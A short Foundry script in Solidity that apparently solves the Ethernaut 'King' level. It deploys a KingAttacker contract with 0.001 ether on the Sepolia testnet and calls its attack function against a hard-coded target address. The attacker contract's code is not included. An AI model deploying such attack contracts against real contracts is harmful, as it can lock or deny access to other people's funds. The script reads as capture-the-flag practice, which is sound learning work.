// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {KingAttacker} from "../src/KingAttacker.sol";

contract KingAttackerScript is Script {
    function run() external {
        address targetAddress = 0x63899275c274eEa78821859Da9560b8A4324bcF6;

        vm.createSelectFork(vm.envString("SEPOLIA_RPC_URL"));
        vm.startBroadcast(vm.envUint("SEPOLIA_PRIVATE_KEY"));

        KingAttacker attacker = new KingAttacker{value: 0.001 ether}();

        attacker.attack(payable(targetAddress));
        console.log("Attack!");

        vm.stopBroadcast();

        console.log("Attack complete.");
    }
}
